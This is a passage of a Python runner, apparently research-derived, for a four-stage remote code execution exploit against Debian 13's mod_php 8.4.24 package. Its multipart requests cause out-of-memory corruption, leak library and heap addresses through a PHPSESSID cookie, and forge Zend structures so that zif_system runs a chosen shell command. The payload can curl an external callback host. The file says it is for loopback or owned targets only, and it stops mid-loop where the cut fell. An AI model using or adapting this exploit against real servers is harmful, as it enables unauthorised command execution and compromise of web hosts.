#!/usr/bin/env python3
"""Debian 13 mod_php 8.4.24 four-stage runner (research-derived, additive).

This is a standalone runner, not a ``--profile`` entry: the existing
BINARY_PROFILES/COMPACT chain is keyed to other builds and must not be
silently reused for the Debian package.

Target (exact package):
    libapache2-mod-php8.4 8.4.24-1~deb13u1
    libphp8.4.so 5,980,008 bytes
    prefork mod_php, output_buffering=4096, one 22-byte PHP endpoint
    (``<?php echo "OK\\n"; ?>``)

Four stages, one HTTP request shape each:

    A1  chunked multipart OOM in the request-END cleanup
    B1  chunked multipart re-entry; the Set-Cookie PHPSESSID header leaks
        the main ZendMM chunk and the libphp8.4.so base
    A2  plain multipart OOM with 116 fillers (dangling PS(http_session_vars))
    B2  plain multipart fake zend_reference spray + fake zend_array; the
        fake pDestructor is ``zif_system`` at ``lib + 0x24cdd0``

Per-package constants (measured 2026-10-23, four blind runs + two controls):
    S (fake zend_array) = main + 0xF7398
    fillers             = 116
    zif_system          = lib + 0x24cdd0
    zval_ptr_dtor       = lib + 0x424ff0

Proof does not use ``docker exec`` or a container filesystem.  The command
payload can call back over HTTP (``--lhost/--lport`` starts a local collector,
or ``--callback`` points at an external one) and/or write a proof file that
the runner reads when it shares the target's filesystem (bare-metal local
use).  A 200/500 response alone is never treated as success.

Body bytes are regenerated from the research generators (mk_a1.py,
mk_leak_b.py, cheap_oom_a.build_body, fake_ref_b + mk_ht) and checked
against their known sizes/hashes before any live traffic is sent.

Usage:
    python3 -m tool.debian8424 --url http://127.0.0.1:8080/ --dry-run
    python3 -m tool.debian8424 --url http://127.0.0.1:8080/ \
        --lhost 127.0.0.1 --lport 9001 --command id --live

Loopback/operator-owned targets only.  The chain is research-derived and
package-specific; do not apply it to another 8.4.24 build (official images
have different symbols, filler count and S anchor).
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import secrets
import shlex
import socket
import struct
import threading
import time
import urllib.parse
from collections import Counter
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

BOUNDARY = b"C" * 10

PROFILE = {
    "name": "debian13-modphp-8.4.24",
    "package": "libapache2-mod-php8.4 8.4.24-1~deb13u1",
    "libphp_size": 5980008,
    "s_offset": 0xF7398,
    "fillers": 116,
    "zif_system_offset": 0x24CDD0,
    "zval_ptr_dtor_offset": 0x424FF0,
    "main_bucket_count": 88,
}

# Fixed bodies, verified against the research tree.  B2 is size-stable but
# its hash depends on the runtime S/zif and the command.
EXPECTED_BODIES = {
    "a1": (1060211, "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"),
    "b1": (33128677, "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"),
    "a2": (279432, "7d3e674eed2cad578362a9177c93d67d37b02781a32878be7ea599a3c13ad3c6"),
    "b2": (451384, None),
}

A1_QUERY = "q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
B1_SPEC = ("G:511:0x137 " * 14 + "G:400:0x137 G:511:0x137 X:900").split()
MARKER_RE = re.compile(r"^[A-Za-z0-9_.-]{1,32}$")


# ---------------------------------------------------------------------------
# Body builders (byte-compatible with the research generators)
# ---------------------------------------------------------------------------

def _part(name: bytes, value: bytes = b"", filename: bytes | None = None,
          ctype: bytes | None = None, terminate: bool = True) -> bytes:
    out = bytearray(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
    if filename is not None:
        out.extend(b"; filename=\"" + filename + b"\"")
    out.extend(b"\r\n")
    if ctype is not None:
        out.extend(b"Content-Type: " + ctype + b"\r\n")
    out.extend(b"\r\n" + value)
    if terminate:
        out.extend(b"\r\n")
    return bytes(out)


def _nest_name(i: int, depth: int, key_pad: int = 0) -> bytes:
    if depth < 2:
        raise ValueError("depth must be >= 2")
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def build_a1(parts: int = 860, depth: int = 64, key_pad: int = 90,
             fillers128: int = 14, big: int = 78, big_len: int = 8000,
             burners: int = 20, burner_len: int = 4000,
             progress_len: int = 4000, sid_hex: str = "00") -> bytes:
    """mk_a1.py defaults: A1 chunked OOM body."""
    out = bytearray()
    out += _part(b"PHPSESSID", bytes.fromhex(sid_hex))
    for i in range(parts):
        is_mixed = i == 0
        is_mixed2 = i == 1
        ctype = (b"C" * 103 if is_mixed else
                 b"C" * 231 if is_mixed2 else b"application/octet-stream")
        out += _part(
            _nest_name(i, depth, key_pad),
            filename=b"A" if (is_mixed or is_mixed2) else b"",
            ctype=ctype,
            terminate=False,
        )
    for i in range(fillers128):
        out += _part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        out += _part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        out += _part(("u%02d" % i).encode(), b"U" * burner_len)
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def _tag8(idx: int, tagged: bool) -> bytes:
    if tagged:
        return b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
    return b"BBBB/BBB"


def _forge_fill_value(pages: int, page: int, fake_len: int,
                      idx: int = 0, tagged: bool = True) -> bytes:
    length = pages * 4096 - 25
    value = bytearray(b"A" * length)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 8 <= length:
        struct.pack_into("<I", value, hdr + 0x00, 0)
        struct.pack_into("<I", value, hdr + 0x04, 0x16)
        struct.pack_into("<Q", value, hdr + 0x08, 0)
        struct.pack_into("<Q", value, hdr + 0x10, fake_len)
        value[hdr + 0x18:hdr + 0x18 + 8] = _tag8(idx, tagged)
    return bytes(value)


def build_b1(spec: list[str] | None = None, fake_len: int = 0xC8000,
             tag: bool = True, sid: bytes = b"a", progress: bytes = b"k0",
             name_len: int = 120) -> bytes:
    """mk_leak_b.py spec used for the Debian/upstream B1 leak."""
    out = bytearray()
    out += _part(b"PHPSESSID", sid)
    if not any(item.partition(":")[0] == "P" for item in (spec or [])):
        out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    idx = 0
    for item in (spec or B1_SPEC):
        kind, _, arg = item.partition(":")
        if kind in ("F", "S"):
            pages = int(arg, 0)
            value = (b"A" if kind == "F" else b"S") * (pages * 4096 - 25)
        elif kind == "G":
            pages_s, _, page_s = arg.partition(":")
            value = _forge_fill_value(int(pages_s, 0), int(page_s, 0),
                                      fake_len, idx, tag)
        elif kind == "X":
            for _ in range(int(arg, 0)):
                out += _part(("x%05d" % idx).encode() + b"[a]" * 12, b"v")
                idx += 1
            continue
        else:
            raise ValueError("unsupported B1 spec item %r" % item)
        name = (b"f%04d" % idx).ljust(name_len, b"f")[:name_len]
        out += _part(name, value)
        idx += 1
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def build_a2(parts: int = 880, depth: int = 64, fillers: int = 116,
             sid: bytes = b"a" * 32, progress: bytes = b"k0") -> bytes:
    """cheap_oom_a.build_body(880, 64, 116, b"a"*32, b"k0", b"C"*10)."""
    out = bytearray()
    out += _part(b"PHPSESSID", sid)
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)
    for i in range(fillers):
        out += _part(("%03d" % i).encode(), b"x")
    for i in range(parts):
        out += _part(_nest_name(i, depth, 0), filename=b"",
                     ctype=b"application/octet-stream", terminate=False)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def _fake_ref(ptr: int, rc: int, val_type: int) -> bytes:
    value = bytearray(32)
    struct.pack_into("<I", value, 0, rc)
    value[4] = 0x0A
    struct.pack_into("<Q", value, 8, ptr)
    struct.pack_into("<I", value, 16, val_type)
    return bytes(value)


def _make_spray(vl: int, ptr: int, rc: int, val_type: int,
                ref_start: int = 8, ref_step: int = 32) -> bytes:
    value = bytearray(b"S" * vl)
    off = ref_start
    while off + 32 <= vl:
        value[off:off + 32] = _fake_ref(ptr, rc, val_type)
        off += ref_step
    return bytes(value)


def _make_name(prefix: bytes, i: int, nlen: int) -> bytes:
    base = prefix + ("%09d" % i).encode()
    return (base + b"x" * nlen)[:nlen]


def build_ht(htdata: int, zif: int, cmd: bytes, size: int = 384) -> bytes:
    """mk_ht.py build(): fake zend_array + fake execute_data + argument string."""
    if len(cmd) > 0x160 - 0x98:
        raise ValueError(
            "B2 command is %d bytes; the 384-byte ht carrier holds at most %d"
            % (len(cmd), 0x160 - 0x98)
        )
    ht = bytearray(b"\x00" * size)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    e = 0x20
    struct.pack_into("<Q", ht, e + 0x00, 0)
    struct.pack_into("<Q", ht, e + 0x08, 0)
    struct.pack_into("<Q", ht, e + 0x10, zif)
    struct.pack_into("<Q", ht, e + 0x18, 0)
    struct.pack_into("<Q", ht, e + 0x20, 0)
    struct.pack_into("<I", ht, e + 0x28, 0)
    struct.pack_into("<I", ht, e + 0x2C, 1)
    struct.pack_into("<Q", ht, e + 0x30, 0)
    struct.pack_into("<Q", ht, e + 0x38, 0)
    struct.pack_into("<I", ht, e + 0x40, 0)
    struct.pack_into("<Q", ht, e + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, e + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def build_b2(s: int, zif: int, cmd: bytes, vl: int = 384,
             n1: int = 500, n2: int = 495, name_len: int = 10) -> bytes:
    """fake_ref_b.py spray + mk_ht.py ht; same shape as chain84.b2_body."""
    spray = _make_spray(vl, s, 1, 0x0107, 8, 32)
    ht = build_ht(s, zif, cmd, vl)
    out = bytearray()
    for i in range(n1):
        out += _part(_make_name(b"s", i, name_len), spray)
    out += _part(b"ht", ht)
    out += _part(b"PHPSESSID", b"a" * 32)
    out += _part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        out += _part(_make_name(b"t", i, name_len), spray)
    out += b"--" + BOUNDARY + b"--\r\n"
    return bytes(out)


def body_record(name: str, data: bytes, expected: tuple[int, str | None] | None = None) -> dict:
    record = {
        "bytes": len(data),
        "sha256": hashlib.sha256(data).hexdigest(),
    }
    if expected is not None:
        size, digest = expected
        record["expected_bytes"] = size
        record["expected_sha256"] = digest
        record["size_ok"] = len(data) == size
        record["sha256_ok"] = digest is None or record["sha256"] == digest
        record["ok"] = record["size_ok"] and record["sha256_ok"]
    return record


# ---------------------------------------------------------------------------
# HTTP transport
# ---------------------------------------------------------------------------

def parse_target(url: str) -> tuple[str, int, str, str]:
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme != "http":
        raise ValueError("URL must be http:// (the chain is plain HTTP)")
    if parsed.username or parsed.password or parsed.fragment:
        raise ValueError("URL must be uncredentialed and without a fragment")
    if not parsed.hostname:
        raise ValueError("URL has no host")
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    path.encode("ascii")
    host_header = parsed.hostname if port == 80 else "%s:%d" % (parsed.hostname, port)
    return parsed.hostname, port, path, host_header


def _read_response(sock: socket.socket, max_bytes: int) -> bytes:
    chunks = []
    total = 0
    while total < max_bytes:
        try:
            data = sock.recv(262144)
        except (socket.timeout, TimeoutError):
            break
        except OSError:
            break
        if not data:
            break
        chunks.append(data)
        total += len(data)
    return b"".join(chunks)


def _request_head(host_header: str, path: str, body_len: int | None,
                  chunked: bool) -> bytes:
    head = (b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
            b"Host: " + host_header.encode("ascii") + b"\r\n"
            b"Content-Type: multipart/form-data; boundary=" + BOUNDARY + b"\r\n")
    if chunked:
        head += b"Transfer-Encoding: chunked\r\n"
    else:
        head += b"Content-Length: " + str(body_len).encode("ascii") + b"\r\n"
    head += b"Connection: close\r\n\r\n"
    return head


def send_plain(host: str, port: int, path: str, host_header: str,
               body: bytes, timeout: float, max_bytes: int) -> tuple[bytes, float]:
    started = time.time()
    sock = socket.create_connection((host, port), timeout=min(10.0, timeout))
    sock.settimeout(timeout)
    try:
        sock.sendall(_request_head(host_header, path, len(body), False) + body)
        return _read_response(sock, max_bytes), time.time() - started
    finally:
        sock.close()


def send_chunked(host: str, port: int, path: str, host_header: str,
                 body: bytes, timeout: float, max_bytes: int,
                 chunk: int = 65536) -> tuple[bytes, float]:
    started = time.time()
    sock = socket.create_connection((host, port), timeout=min(10.0, timeout))
    sock.settimeout(timeout)
    try:
        sock.sendall(_request_head(host_header, path, None, True))
        for offset in range(0, len(body), chunk):
            piece = body[offset:offset + chunk]
            sock.sendall(("%x\r\n" % len(piece)).encode("ascii") + piece + b"\r\n")
        sock.sendall(b"0\r\n\r\n")
        return _read_response(sock, max_bytes), time.time() - started
    finally:
        sock.close()


def status_of(raw: bytes) -> tuple[int, str]:
    line = raw.split(b"\r\n", 1)[0].decode("latin1", "replace")
    try:
        code = int(line.split()[1])
    except (IndexError, ValueError):
        code = 0
    return code, line


def parse_leak(raw: bytes, zdtor_off: int,
               main_bucket_count: int = PROFILE["main_bucket_count"]) -> dict:
    """Recover libphp8.4.so and the main ZendMM chunk from Set-Cookie."""
    head, _, _body = raw.partition(b"\r\n\r\n")
    haystack = head if b"Set-Cookie" in head or b"set-cookie" in head else raw
    lowered = haystack.lower()
    marker = b"set-cookie: phpsessid="
    index = lowered.find(marker)
    if index < 0:
        raise ValueError("no Set-Cookie: PHPSESSID")
    value = haystack[index + len(marker):].split(b"\r\n", 1)[0]
    decoded = urllib.parse.unquote_to_bytes(value.decode("latin1"))

    counts: Counter[int] = Counter()
    for offset in range(0, len(decoded) - 8, 8):
        pointer = struct.unpack_from("<Q", decoded, offset)[0]
        if 0x7F0000000000 <= pointer <= 0x7FFFFFFFFFFFFF:
            counts[pointer] += 1
    if not counts:
        raise ValueError("no pointers in the decoded Set-Cookie")

    zdtor, top_hits = counts.most_common(1)[0]
    lib = zdtor - zdtor_off
    buckets: Counter[int] = Counter()
    for pointer, count in counts.items():
        buckets[pointer & ~0x1FFFFF] += count
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    candidates = [(bucket, count) for bucket, count in buckets.most_common()
                  if bucket not in (lib_bucket, id_bucket)]
    candidates.sort(key=lambda item: (abs(item[1] - main_bucket_count), item[1]))
    return {
        "decoded": len(decoded),
        "zdtor": zdtor,
        "lib": lib,
        "top_zdtor_hits": top_hits,
        "main_candidates": [bucket for bucket, _ in candidates[:3]],
        "cand_counts": {hex(bucket): count for bucket, count in candidates[:3]},
    }


# ---------------------------------------------------------------------------
# Evidence channels
# ---------------------------------------------------------------------------

class _CallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802 (stdlib handler name)
        self.server.hits.append({"path": self.path, "at": time.time()})  # type: ignore[attr-defined]
        body = b"OK\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt: str, *args) -> None:
        pass


class _CallbackServer(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, address: tuple[str, int]):
        super().__init__(address, _CallbackHandler)
        self.hits: list[dict] = []


class CallbackCollector:
    def __init__(self, host: str, port: int):
        self.server = _CallbackServer((host, port))
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.started = False

    def start(self) -> None:
        self.thread.start()
        self.started = True

    def stop(self) -> None:
        if self.started:
            self.server.shutdown()
        self.server.server_close()

    def hits(self) -> list[dict]:
        return list(self.server.hits)


def read_from(path: str | None, offset: int) -> tuple[str, int]:
    if not path or not os.path.exists(path):
        return "", offset
    try:
        size = os.path.getsize(path)
        if size < offset:
            offset = 0
        with open(path, "rb") as handle:
            handle.seek(offset)
            data = handle.read()
    except OSError:
        return "", offset
    return data.decode("latin1", "replace"), size


def build_payload(command: str, marker: str, proof_path: str,
                  callback_url: str | None) -> str:
    """Shell command executed by the fake zif_system; max 200 bytes."""
    proof = shlex.quote(proof_path)
    tail = ""
    if callback_url:
        url = callback_url.rstrip("/") + "/" + marker
        tail = "; curl -s -m 3 %s >/dev/null 2>&1" % shlex.quote(url)
    if command == "id":
        # Same shape as the research chain (id twice: stdout proof + stderr).
        variants = [
            "id>%s;echo %s>>%s;id>&2;echo %s>&2%s" % (proof, marker, proof, marker, tail),
            "id>%s;echo %s>>%s;echo %s>&2%s" % (proof, marker, proof, marker, tail),
            "id>%s;echo %s>>%s%s" % (proof, marker, proof, tail),
        ]
    else:
        variants = [
            "%s>%s 2>&1;cat %s>&2;echo %s>&2%s" % (command, proof, proof, marker, tail),
            "%s>%s 2>&1;echo %s>>%s;cat %s>&2%s" % (command, proof, marker, proof, proof, tail),
            "%s>%s 2>&1;echo %s>>%s%s" % (command, proof, marker, proof, tail),
        ]
    for variant in variants:
        if len(variant.encode("utf-8")) <= 0x160 - 0x98:
            return variant
    raise ValueError(
        "B2 command is %d bytes after assembly; the ht carrier allows at most %d. "
        "Shorten --command/--marker/--proof-file or drop the callback."
        % (len(variants[-1].encode("utf-8")), 0x160 - 0x98)
    )


def profile_summary() -> dict:
    data = dict(PROFILE)
    for key in ("s_offset", "zif_system_offset", "zval_ptr_dtor_offset"):
        data[key] = hex(data[key])
    return data


def default_output() -> Path:
    stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    return Path(__file__).resolve().parent.parent / "files" / "io" / ("debian8424-" + stamp)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Debian 13 libapache2-mod-php8.4 8.4.24 four-stage runner "
                    "(A1 -> B1 -> A2 -> B2). Dry-run is the default; --live sends.",
        epilog="Research-derived, package-specific. Loopback/operator-owned targets only.",
    )
    parser.add_argument("--url", required=True,
                        help="target URL, e.g. http://127.0.0.1:8080/ (the PHP endpoint)")
    parser.add_argument("--command", default="id",
                        help="command executed through the fake zif_system (default: id)")
    parser.add_argument("--lhost", default="127.0.0.1",
                        help="callback host advertised to the target (default: 127.0.0.1)")
    parser.add_argument("--lport", type=int, default=0,
                        help="start a local HTTP callback collector on this port "
                             "(0 = no collector; use --callback for an external one)")
    parser.add_argument("--listen-host", default="0.0.0.0",
                        help="bind address for the local callback collector (default: 0.0.0.0)")
    parser.add_argument("--callback", default=None,
                        help="external callback base URL, e.g. http://10.0.0.5:9001; "
                             "the payload requests <callback>/<marker>")
    parser.add_argument("--callback-log", default=None,
                        help="file written by an external callback collector; new lines "
                             "containing the marker count as proof")
    parser.add_argument("--proof-file", default=None,
                        help="target-written proof path (default: /tmp/p1_conc_<marker>); "
                             "read only when the runner shares the target filesystem")
    parser.add_argument("--error-log", default=None,
                        help="optional Apache error log to scan for new marker lines")
    parser.add_argument("--timeout", type=float, default=180.0,
                        help="per-request socket timeout in seconds (default: 180)")
    parser.add_argument("--output", type=Path, default=None,
                        help="receipt directory (default: files/io/debian8424-<UTC stamp>)")
    parser.add_argument("--marker", default=None,
                        help="proof marker (default: D8424 + 6 hex; [A-Za-z0-9_.-]{1,32})")
    parser.add_argument("--b1-attempts", type=int, default=5,
                        help="concurrent B1 requests (default: 5, the research matrix value)")
    parser.add_argument("--b2-attempts", type=int, default=8,
                        help="B2 rotations after one A2 (default: 8)")
    parser.add_argument("--main-index", type=int, default=0,
                        help="index into the B1 main-chunk candidates (default: 0)")
    parser.add_argument("--a1-query", default=A1_QUERY,
                        help="query string appended to A1 (default: the five q00000xx pairs)")
    parser.add_argument("--max-response", type=int, default=32 << 20,
                        help="cap on a single HTTP response read (default: 32 MiB)")
    parser.add_argument("--preflight", action="store_true",
                        help="send one benign GET before A1 and record status/Server")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--live", action="store_true",
                       help="actually send the four stages (default: build only)")
    group.add_argument("--dry-run", action="store_true",
                       help="build bodies and print the plan without opening a socket")
    return parser


def validate_args(parser: argparse.ArgumentParser, args: argparse.Namespace) -> None:
    if args.timeout <= 0:
        parser.error("--timeout must be > 0")
    if not 0 <= args.lport <= 65535:
        parser.error("--lport must be between 0 and 65535")
    if args.b1_attempts < 1 or args.b1_attempts > 32:
        parser.error("--b1-attempts must be between 1 and 32")
    if args.b2_attempts < 1 or args.b2_attempts > 64:
        parser.error("--b2-attempts must be between 1 and 64")
    if args.main_index < 0 or args.main_index > 2:
        parser.error("--main-index must be 0, 1 or 2")
    if args.max_response < 4096:
        parser.error("--max-response must be at least 4096")
    if args.marker is None:
        args.marker = "D8424" + secrets.token_hex(3).upper()
    if not MARKER_RE.match(args.marker):
        parser.error("--marker must match [A-Za-z0-9_.-]{1,32}")
    if "\x00" in args.command or "\n" in args.command or "\r" in args.command:
        parser.error("--command must be a single shell line without NUL/newline")
    if args.callback:
        parsed = urllib.parse.urlsplit(args.callback)
        if (parsed.scheme != "http" or not parsed.hostname or parsed.username
                or parsed.password or parsed.query or parsed.fragment):
            parser.error("--callback must be an uncredentialed http:// base URL "
                         "without query/fragment")
        args.callback = args.callback.rstrip("/")
    if args.callback and args.lport:
        parser.error("use either --callback or --lport, not both")
    if args.callback_log and not args.callback:
        parser.error("--callback-log requires --callback")
    if args.proof_file is None:
        args.proof_file = "/tmp/p1_conc_%s" % args.marker


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    validate_args(parser, args)

    try:
        host, port, path, host_header = parse_target(args.url)
    except (ValueError, UnicodeEncodeError) as error:
        parser.error(str(error))

    live = bool(args.live)
    output = args.output or default_output()
    output.mkdir(parents=True, exist_ok=True)

    summary: dict = {
        "runner": "debian8424",
        "profile": profile_summary(),
        "target": {"url": args.url, "host": host, "port": port,
                   "path": path, "host_header": host_header},
        "dry_run": not live,
        "command": args.command,
        "marker": args.marker,
        "proof_file": args.proof_file,
        "callback": args.callback or (("http://%s:%d" % (args.lhost, args.lport))
                                      if args.lport else None),
        "stages": [],
        "success": False,
    }

    # Build and verify the fixed bodies before any traffic.
    bodies = {
        "a1": build_a1(),
        "b1": build_b1(),
        "a2": build_a2(fillers=PROFILE["fillers"]),
    }
    summary["bodies"] = {}
    bad = []
    for name, data in bodies.items():
        record = body_record(name, data, EXPECTED_BODIES[name])
        summary["bodies"][name] = record
        (output / (name + ".bin")).write_bytes(data)
        if not record["ok"]:
            bad.append(name)
    if bad:
        summary["error"] = "body mismatch: " + ", ".join(bad)
        summary["notes"] = [
            "The fixed-body builders do not match the research receipts; refusing to send.",
            "A1/B1/A2 sizes/hashes are recorded above.",
        ]
        (output / "result.json").write_text(json.dumps(summary, indent=1) + "\n")
        print(json.dumps(summary, indent=1, sort_keys=True))
        return 2

    # B2 depends on runtime addresses.  Dry-run records a placeholder body of
    # the same size; live replaces it after B1.
    if live:
        b2 = None
        summary["bodies"]["b2"] = {"bytes": EXPECTED_BODIES["b2"][0],
                                   "pending": "generated after B1"}
    else:
        try:
            placeholder = build_payload(args.command, args.marker, args.proof_file,
                                        summary["callback"])
            b2 = build_b2(0, 0, placeholder.encode())
        except ValueError as error:
            parser.error(str(error))
        record = body_record("b2", b2, EXPECTED_BODIES["b2"])
        record["note"] = "placeholder S=0/zif=0; size is address-independent"
        summary["bodies"]["b2"] = record
        (output / "b2.dry.bin").write_bytes(b2)

    if not live:
        summary["notes"] = [
            "dry-run: no socket opened; pass --live to send A1 -> B1 -> A2 -> B2",
            "live B2 uses S = main + 0x%X, zif_system = lib + 0x%X"
            % (PROFILE["s_offset"], PROFILE["zif_system_offset"]),
            "proof requires a target callback or a target-written marker; "
            "a 200/500 response alone is not success",
        ]
        (output / "result.json").write_text(json.dumps(summary, indent=1) + "\n")
        print(json.dumps(summary, indent=1, sort_keys=True))
        return 0

    collector: CallbackCollector | None = None
    callback_url = summary["callback"]
    proof_initial = ""
    proof_path = Path(args.proof_file)
    try:
        proof_initial = proof_path.read_text(errors="replace") if proof_path.exists() else ""
    except OSError:
        proof_initial = ""
    # Default proof path: remove a stale file so the marker is new.
    if args.proof_file == "/tmp/p1_conc_%s" % args.marker:
        try:
            proof_path.unlink()
        except FileNotFoundError:
            pass
        except OSError:
            pass
        proof_initial = ""

    err_offset = os.path.getsize(args.error_log) if args.error_log and os.path.exists(args.error_log) else 0
    cb_offset = os.path.getsize(args.callback_log) if args.callback_log and os.path.exists(args.callback_log) else 0

    def stage_row(name: str, raw: bytes, elapsed: float, index: int | None = None) -> dict:
        code, line = status_of(raw)
        row = {"stage": name, "status": code, "status_line": line,
               "bytes": len(raw), "elapsed": round(elapsed, 3)}
        if not raw:
            row["note"] = "no HTTP response (EOF)"
        if index is not None:
            row["i"] = index
        summary["stages"].append(row)
        return row

    try:
        if args.lport and not args.callback:
            try:
                collector = CallbackCollector(args.listen_host, args.lport)
                collector.start()
            except OSError as error:
                summary["error"] = "callback collector bind failed: %s: %s" % (
                    type(error).__name__, error)
                (output / "result.json").write_text(json.dumps(summary, indent=1) + "\n")
                print(json.dumps(summary, indent=1, sort_keys=True))
                return 2

        if args.preflight:
            try:
                started = time.time()
                sock = socket.create_connection((host, port), timeout=min(10.0, args.timeout))
                sock.settimeout(args.timeout)
                try:
                    sock.sendall(("GET %s HTTP/1.0\r\nHost: %s\r\n\r\n"
                                  % (path, host_header)).encode("ascii"))
                    raw = _read_response(sock, min(args.max_response, 1 << 20))
                finally:
                    sock.close()
                summary["preflight"] = stage_row("preflight", raw, time.time() - started)
            except OSError as error:
                summary["preflight"] = {"stage": "preflight",
                                        "error": "%s: %s" % (type(error).__name__, error)}

        # ---- A1 -----------------------------------------------------------
        a1_path = path + ("&" if "?" in path else "?") + args.a1_query.lstrip("?")
        try:
            raw, elapsed = send_chunked(host, port, a1_path, host_header, bodies["a1"],
                                        args.timeout, args.max_response)
            summary["a1"] = stage_row("A1", raw, elapsed)
        except OSError as error:
            summary["error"] = "A1 transport: %s: %s" % (type(error).__name__, error)
            summary["stages"].append({"stage": "A1", "error": summary["error"]})
            (output / "result.json").write_text(json.dumps(summary, indent=1) + "\n")
            print(json.dumps(summary, indent=1, sort_keys=True))
            return 4

        # ---- B1 (concurrent, one leak expected) ---------------------------
        def b1_worker(index: int) -> tuple[int, bytes, float, str | None]:
            try:
                raw, elapsed = send_chunked(host, port, path, host_header, bodies["b1"],
                                            args.timeout, args.max_response)
                return index, raw, elapsed, None
            except OSError as error:
                return index, b"", 0.0, "%s: %s" % (type(error).__name__, error)

        with ThreadPoolExecutor(max_workers=args.b1_attempts) as pool:
            results = list(pool.map(b1_worker, range(args.b1_attempts)))

        hit = None
        for index, raw, elapsed, error in sorted(results, key=lambda item: item[0]):
            row = stage_row("B1", raw, elapsed, index)
            (output / ("b1_%d.resp" % index)).write_bytes(raw)
            if error:
                row["leak"] = "error"
                row["error"] = error
                continue
            if b"Set-Cookie: PHPSESSID=" not in raw and b"set-cookie: phpsessid=" not in raw.lower():
                row["leak"] = "miss"
                continue
            try:
                info = parse_leak(raw, PROFILE["zval_ptr_dtor_offset"])
            except (ValueError, struct.error) as error:
                row["leak"] = "error"
                row["error"] = str(error)
                continue
            candidate = (info["main_candidates"][args.main_index]
                         if len(info["main_candidates"]) > args.main_index else None)
            row.update({
                "leak": "hit",
                "decoded": info["decoded"],
                "lib": hex(info["lib"]),
                "main": hex(candidate) if candidate is not None else None,
                "cand_counts": info["cand_counts"],
            })
            if hit is None and candidate is not None:
                hit = info
                row["chosen"] = True
        if hit is None:
            summary["error"] = "B1 produced no usable leak"
            summary["notes"] = [
                "B1 is probabilistic: the A1 child must serve the next request.",
                "No proof was attempted; fix pinning/prefork state and rerun.",
            ]
            (output / "result.json").write_text(json.dumps(summary, indent=1) + "\n")
            print(json.dumps(summary, indent=1, sort_keys=True))
            return 3

        main_addr = hit["main_candidates"][args.main_index]
        lib = hit["lib"]
        s_addr = main_addr + PROFILE["s_offset"]
        zif = lib + PROFILE["zif_system_offset"]
        summary["derived"] = {
            "main": hex(main_addr),
            "lib": hex(lib),
            "lib_minus_main": hex(lib - main_addr),
            "S": hex(s_addr),
            "zif_system": hex(zif),
            "zval_ptr_dtor": hex(lib + PROFILE["zval_ptr_dtor_offset"]),
        }

        # ---- A2 -----------------------------------------------------------
        try:
            raw, elapsed = send_plain(host, port, path, host_header, bodies["a2"],
                                      args.timeout, args.max_response)
            summary["a2"] = stage_row("A2", raw, elapsed)
            (output / "a2.resp").write_bytes(raw)
        except OSError as error:
            summary["error"] = "A2 transport: %s: %s" % (type(error).__name__, error)
            summary["stages"].append({"stage": "A2", "error": summary["error"]})
            (output / "result.json").write_text(json.dumps(summary, indent=1) + "\n")
            print(json.dumps(summary, indent=1, sort_keys=True))
            return 4

        # ---- B2 -----------------------------------------------------------
        try:
            payload = build_payload(args.command, args.marker, args.proof_file, callback_url)
        except ValueError as error:
            parser.error(str(error))
        b2 = build_b2(s_addr, zif, payload.encode())
        b2_record = body_record("b2", b2, EXPECTED_BODIES["b2"])
        b2_record["cmd"] = payload
        summary["bodies"]["b2"] = b2_record
        (output / "b2.bin").write_bytes(b2)

        evidence: dict = {"callback_hits": [], "proof": None,
                          "error_log": None, "callback_log": None}
        success = False
        b2_hit = None
        for index in range(args.b2_attempts):
            try:
                raw, elapsed = send_plain(host, port, path, host_header, b2,
